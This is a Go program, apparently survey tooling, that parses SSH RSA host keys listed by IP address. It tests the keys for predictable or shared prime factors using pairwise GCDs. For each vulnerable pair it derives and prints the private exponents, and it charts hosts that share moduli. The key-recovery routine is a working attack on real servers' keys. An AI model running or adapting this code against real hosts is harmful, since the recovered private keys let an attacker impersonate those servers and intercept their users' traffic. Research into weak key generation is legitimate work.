package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"log"
	"math/big"
	"os"
	"sort"
	"strconv"
	"strings"

	"crypto/rsa"

	"github.com/wcharczuk/go-chart"
	"github.com/wcharczuk/go-chart/drawing"
	"golang.org/x/crypto/ssh"
)

type clique struct {
	cap int
}

func nextprime(a *big.Int) *big.Int {
	two := big.NewInt(2)
	b := new(big.Int).Or(a, big.NewInt(1))
	for {
		if b.ProbablyPrime(20) {
			return b
		}
		b.Add(b, two)
	}
}

func getProbableDivisors(keylen int) (res []*big.Int) {
	p := new(big.Int)
	p.SetBit(p, keylen/2-1, 1)
	p = nextprime(p)
	res = append(res, p)
	p = nextprime(p.Add(p, big.NewInt(2)))
	res = append(res, p)
	return
}

func collectKeys(filename string) (keymap map[int]map[string]rsa.PublicKey) {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	keymap = make(map[int]map[string]rsa.PublicKey)

	probDivisors := make(map[int][]*big.Int)

	kl := []int{512, 768, 1024, 1040, 2048, 2064, 3072, 4096}
	for _, x := range kl {
		keymap[x] = make(map[string]rsa.PublicKey)
		probDivisors[x] = getProbableDivisors(x)
	}
	fmt.Fprint(os.Stderr, probDivisors)
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		tk := strings.Split(line, " ")
		k, _, _, _, err := ssh.ParseAuthorizedKey([]byte(strings.Join(tk[1:], " ")))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			continue
		}
		km := k.Marshal()
		l1 := binary.BigEndian.Uint32(km[0:4])
		l2 := binary.BigEndian.Uint32(km[4+l1 : 4+l1+4])
		ea := km[4+l1+4 : 4+l1+4+l2]
		var e uint
		for i := 0; i < len(ea); i++ {
			e += uint(ea[i]) << (8 * uint(len(ea)-1-i))
		}
		nl := binary.BigEndian.Uint32(km[4+l1+4+l2 : 4+l1+4+l2+4])
		na := km[4+l1+4+l2+4 : 4+l1+4+l2+4+nl]
		n := new(big.Int).SetBytes(na)
		if _, ok := keymap[len(n.Bytes())*8][tk[0]]; ok {
			fmt.Fprintf(os.Stderr, "Duplicating IP: %s\n", tk[0])
		}
		keymap[len(n.Bytes())*8][tk[0]] = rsa.PublicKey{
			E: int(e),
			N: n,
		}
		for _, d := range probDivisors[len(n.Bytes())*8] {
			if dd := new(big.Int).Mod(n, d); dd.Cmp(big.NewInt(0)) == 0 {
				fmt.Printf("Found vulnerable key: %s\n", n.String())
			}
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return
}

func comb(n, m int, emit func([]int)) {
	s := make([]int, m)
	last := m - 1
	var rc func(int, int)
	rc = func(i, next int) {
		for j := next; j < n; j++ {
			s[i] = j
			if i == last {
				emit(s)
			} else {
				rc(i+1, j+1)
			}
		}
		return
	}
	rc(0, 0)
}

func attac(km map[string]rsa.PublicKey) {
	var keys []string
	for k := range km {
		keys = append(keys, k)
	}
	cliquemap := make(map[string]*clique)
	cliquemap_inv := make(map[*clique][]string)
	unity := new(big.Int).SetUint64(1)
	l := strconv.Itoa(len(km[keys[0]].N.Bytes()) * 8)
	gg, err := os.Create("graph" + l + ".dot")

	if err != nil {
		log.Fatal(err)
	}
	defer gg.Close()
	fmt.Fprintf(gg, "graph rsa%s {\n", l)
	comb(len(keys), 2, func(c []int) {
		i, j := keys[c[0]], keys[c[1]]
		g := new(big.Int)
		g.GCD(nil, nil, km[i].N, km[j].N)
		if km[i].N.Cmp(km[j].N) == 0 {
			fmt.Fprintf(gg, "	\"%s\" -- \"%s\";\n", i, j)
			_, ok1 := cliquemap[i]
			_, ok2 := cliquemap[j]
			if !ok1 && !ok2 {
				cliquemap[i] = &clique{2}
				cliquemap[j] = cliquemap[i]
			} else if ok1 && !ok2 {
				cliquemap[j] = cliquemap[i]
				cliquemap[j].cap++
			} else if !ok1 && ok2 {
				cliquemap[i] = cliquemap[j]
				cliquemap[i].cap++
			}
		} else if g.Cmp(unity) != 0 {
			p1 := new(big.Int).Div(km[i].N, g)
			p2 := new(big.Int).Div(km[j].N, g)

			g2 := new(big.Int).Sub(g, unity)

			n1 := new(big.Int).Sub(p1, unity)
			n2 := new(big.Int).Sub(p2, unity)
			n1.Mul(n1, g2)
			n2.Mul(n2, g2)

			e1 := big.NewInt(int64(km[i].E))
			e2 := big.NewInt(int64(km[j].E))
			d1 := new(big.Int).ModInverse(e1, n1)
			d2 := new(big.Int).ModInverse(e2, n2)

			pk1 := rsa.PrivateKey{
				PublicKey: km[i],
				D:         d1,
			}

			pk2 := rsa.PrivateKey{
				PublicKey: km[j],
				D:         d2,
			}

			fmt.Printf("Found nontrivial common factor of %s(%s) and %s(%s): %s\n", km[i].N.String(), i, km[j].N.String(), j, g.String())
			fmt.Println("d1 = ", pk1.D)
			fmt.Println("d2 = ", pk2.D)
		}
	})
	fmt.Fprint(gg, "}")
	gg.Sync()
	for k, v := range cliquemap {
		_, ok := cliquemap_inv[v]
		if !ok {
			cliquemap_inv[v] = []string{}
		}
		cliquemap_inv[v] = append(cliquemap_inv[v], k)
	}
	var cliquemap_inv_arr [][]string
	for _, v := range cliquemap_inv {
		cliquemap_inv_arr = append(cliquemap_inv_arr, v)
	}
	sort.SliceStable(cliquemap_inv_arr, func(i, j int) bool { return len(cliquemap_inv_arr[i]) > len(cliquemap_inv_arr[j]) })
	gg2, err := os.Create("equal" + l + ".map")
	if err != nil {
		log.Fatal(err)
	}
	defer gg2.Close()
	gg3, err := os.Create("equal" + l + ".png")
	if err != nil {
		log.Fatal(err)
	}
	defer gg3.Close()
	pie := chart.PieChart{
		Title:      l + "bit",
		TitleStyle: chart.Style{Show: true},
		Width:      1024,
		Height:     1024,
		Values:     []chart.Value{},
	}
	var a int
	for _, v := range cliquemap_inv_arr {
		a += len(v)
		pie.Values = append(pie.Values, chart.Value{Label: strconv.Itoa(len(v)), Value: float64(len(v))})
		fmt.Fprintf(gg2, "%d: %s\n", len(v), v)
	}
	pie.Values = append(pie.Values, chart.Value{Label: strconv.Itoa(len(km)-a) + " unique", Value: float64(len(km) - a), Style: chart.Style{FontColor: drawing.ColorWhite}})
	pie.Render(chart.PNG, gg3)
	gg2.Sync()
	gg3.Sync()

}

func main() {
	kl := []int{512, 768, 1024, 1040, 2048, 3072, 4096}
	keymap := collectKeys("keys.list")
	for _, l := range kl {
		fmt.Printf("%d: %d keys\n", l, len(keymap[l]))
		attac(keymap[l])
	}

}
